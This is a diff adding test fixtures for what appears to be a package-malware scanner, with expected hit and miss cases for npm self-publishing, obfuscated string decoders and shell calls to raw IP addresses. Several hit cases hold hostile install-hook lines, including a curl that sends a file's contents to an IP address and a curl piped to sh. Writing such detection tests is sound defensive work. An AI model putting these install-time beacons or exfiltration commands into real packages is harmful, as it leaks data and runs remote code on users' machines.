@@ -141,6 +141,23 @@
       {"expect": "miss", "why": "Passes the environment to a child process (does not send it out)", "ecosystem": "npm", "layout": "npm", "files": {"index.js": "const env = { ...process.env, NODE_ENV: 'production' };\nspawn('node', ['app.js'], { env });\n"}},
       {"expect": "miss", "why": "Ordinary request that reads no credentials", "ecosystem": "npm", "layout": "npm", "files": {"index.js": "fetch('/api/data').then(r => r.json());\n"}}
     ],
+    "npm_self_publish": [
+      {"expect": "hit", "why": "Spam farm: publishes renamed copies of itself", "ecosystem": "npm", "layout": "npm", "files": {"publishScript.js": "const { exec } = require('child_process');\nexec(`npm publish --access public`, () => {});\n"}},
+      {"expect": "hit", "why": "spawn('npm', ['publish'])", "ecosystem": "npm", "layout": "npm", "files": {"index.js": "require('child_process').spawnSync('npm', ['publish'], {cwd: dir});\n"}},
+      {"expect": "hit", "why": "Install script publishes", "ecosystem": "npm", "layout": "npm", "files": {"package.json#postinstall.sh": "cd /tmp/x && npm publish\n"}},
+      {"expect": "miss", "why": "README or a comment that only mentions npm publish", "ecosystem": "npm", "layout": "npm", "files": {"index.js": "// release with: npm publish (CI only)\nmodule.exports = 1;\n"}}
+    ],
+    "js_obfuscator_io": [
+      {"expect": "hit", "why": "obfuscator.io string-table decoder", "ecosystem": "npm", "layout": "npm", "files": {"x.cjs": "function _0x37b7(_0x13094f,_0x4a80e2){const _0x157b8b=_0x157b();return _0x37b7=function(_0x37b797,_0x34a3c9){_0x37b797=_0x37b797-0x19b;return _0x157b8b[_0x37b797];};}\n"}},
+      {"expect": "miss", "why": "Ordinary minified code", "ecosystem": "npm", "layout": "npm", "files": {"index.min.js": "!function(e,t){var n=e.a,r=t.b;function o(i){return n+i}e.c=o}(window,{b:1});\n"}}
+    ],
+    "shell_raw_address": [
+      {"expect": "hit", "why": "Install-time beacon to an IP", "ecosystem": "npm", "layout": "npm", "files": {"package.json#postinstall.sh": "curl -X GET http://154.38.167.85:9090 || true\n"}},
+      {"expect": "hit", "why": "File content sent to an IP", "ecosystem": "npm", "layout": "npm", "files": {"package.json#postinstall.sh": "curl -G --data-urlencode \"data=$(cat /usr/src/app/flag.txt)\" http://50.116.2.44:4444\n"}},
+      {"expect": "hit", "why": "http host on an odd port", "ecosystem": "npm", "layout": "npm", "files": {"package.json#preinstall.sh": "curl http://arnoxia.cn:8080\n"}},
+      {"expect": "miss", "why": "Local dev server and a normal https download", "ecosystem": "npm", "layout": "npm", "files": {"dev.sh": "curl http://localhost:3000/health\ncurl -fsSL https://github.com/x/y/releases/download/v1/y.tgz -o y.tgz\n"}},
+      {"expect": "miss", "why": "A version number is not an address", "ecosystem": "npm", "layout": "npm", "files": {"get.sh": "wget https://example.com/tool-1.2.3.4.tar.gz\n"}}
+    ],
     "shell_download_exec": [
       {"expect": "hit", "why": "Extensionless shell script installed to bin (language from #!; files placed outside the package are code regardless of language)", "files": {"examplepkg-1.0.data/scripts/setup-x": "#!/bin/sh\ncurl -fsSL https://x.example/i.sh | sh\n"}},
       {"expect": "miss", "why": "Shell script inside a PyPI package (installed inside the package: something else has to run it)", "files": {"examplepkg/tools/x.sh": "curl -fsSL https://x.example/i.sh | sh\n"}},
